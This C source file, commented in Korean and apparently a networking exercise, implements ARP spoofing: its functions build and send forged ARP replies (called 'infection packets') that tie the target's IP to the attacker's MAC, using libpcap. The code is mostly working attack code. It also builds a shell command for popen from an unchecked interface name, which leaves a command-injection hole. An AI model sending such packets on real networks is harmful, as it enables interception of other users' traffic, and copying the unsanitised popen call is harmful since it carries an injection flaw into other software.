#define _POSIX_C_SOURCE 200809L  // POSIX 기능 활성화

#include <stdio.h>     // 표준 입출력 라이브러리, popen/pclose 포함
#include <stdlib.h>    // 표준 라이브러리
#include <string.h>    // 문자열 처리 라이브러리
#include <arpa/inet.h> // 네트워크 관련 라이브러리
#include <unistd.h>    // POSIX 운영체제 API 포함
#include "send_arp.h"  // ARP 관련 헤더 파일 포함

// MAC 주소를 가져오는 함수
void get_my_mac(const char* iface, struct mac_addr* mac) {
    FILE* fp;            // 파일 포인터 선언
    char cmd[128];       // 명령어를 저장할 문자열 배열
    // 시스템 명령어를 준비합니다. 특정 인터페이스의 MAC 주소를 가져오는 명령어입니다.
    snprintf(cmd, sizeof(cmd), "cat /sys/class/net/%s/address", iface);
    
    // 준비한 명령어를 실행하고 결과를 파일처럼 읽어옵니다.
    fp = (FILE*)popen(cmd, "r"); // popen의 반환값을 FILE*로 캐스팅합니다.
    if (fp == NULL) {    // 명령어 실행이 실패했을 경우
        perror("popen"); // 에러 메시지를 출력합니다.
        exit(EXIT_FAILURE); // 프로그램을 종료합니다.
    }

    // MAC 주소를 읽어와서 `mac` 구조체에 저장합니다.
    fscanf(fp, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac->addr[0], &mac->addr[1], &mac->addr[2], &mac->addr[3], &mac->addr[4], &mac->addr[5]);
    
    pclose(fp); // 파일 포인터를 닫습니다.
}

// ARP 감염 패킷을 생성하는 함수
void create_arp_packet(u_char* packet, struct mac_addr* attacker_mac, struct ip_addr* sender_ip, struct ip_addr* target_ip) {
    // 이더넷 헤더와 ARP 헤더를 설정합니다.
    struct eth_header* eth = (struct eth_header*) packet;
    struct arp_header* arp = (struct arp_header*) (packet + sizeof(struct eth_header));

    // 이더넷 헤더 설정
    memset(eth->dest_mac.addr, 0xff, 6); // 수신자 MAC 주소를 브로드캐스트(모든 컴퓨터에게 보내는 것)로 설정합니다.
    memcpy(eth->src_mac.addr, attacker_mac->addr, 6); // 발신자 MAC 주소를 공격자의 MAC 주소로 설정합니다.
    eth->eth_type = htons(ETH_P_ARP); // 이더넷 타입을 ARP로 설정합니다.

    // ARP 헤더 설정
    arp->htype = htons(1); // 하드웨어 타입을 이더넷으로 설정합니다.
    arp->ptype = htons(ETH_P_IP); // 프로토콜 타입을 IPv4로 설정합니다.
    arp->hlen = 6; // 하드웨어 주소 길이를 6바이트로 설정합니다(MAC 주소).
    arp->plen = 4; // 프로토콜 주소 길이를 4바이트로 설정합니다(IP 주소).
    arp->oper = htons(2); // ARP 오퍼레이션을 응답으로 설정합니다(ARP Reply).

    // 공격자의 MAC 주소와 IP 주소를 설정합니다.
    memcpy(arp->sha.addr, attacker_mac->addr, 6);
    memcpy(arp->spa.addr, target_ip->addr, 4);

    // 타겟의 MAC 주소는 알 수 없으므로 0으로 설정합니다.
    memset(arp->tha.addr, 0x00, 6);

    // 타겟의 IP 주소를 설정합니다.
    memcpy(arp->tpa.addr, sender_ip->addr, 4);
}

// 패킷을 전송하는 함수
void send_arp(const char* iface, struct ip_addr* sender_ip, struct ip_addr* target_ip) {
    char errbuf[PCAP_ERRBUF_SIZE]; // 에러 메시지를 저장할 버퍼
    pcap_t* handle; // pcap 핸들러 선언
    u_char packet[42]; // 전송할 패킷을 저장할 배열 (이더넷 헤더 14바이트 + ARP 헤더 28바이트)

    struct mac_addr attacker_mac;
    get_my_mac(iface, &attacker_mac); // 공격자의 MAC 주소를 가져옵니다.

    // ARP 감염 패킷 생성
    create_arp_packet(packet, &attacker_mac, sender_ip, target_ip);

    // pcap_open_live로 인터페이스 열기
    handle = pcap_open_live(iface, BUFSIZ, 1, 1, errbuf);
    if (handle == NULL) { // 인터페이스 열기에 실패했을 경우
        fprintf(stderr, "Couldn't open device %s: %s\n", iface, errbuf);
        return;
    }

    // 패킷 전송
    if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) { // 패킷 전송에 실패했을 경우
        fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(handle));
    }

    pcap_close(handle); // 네트워크 인터페이스를 닫습니다.
}

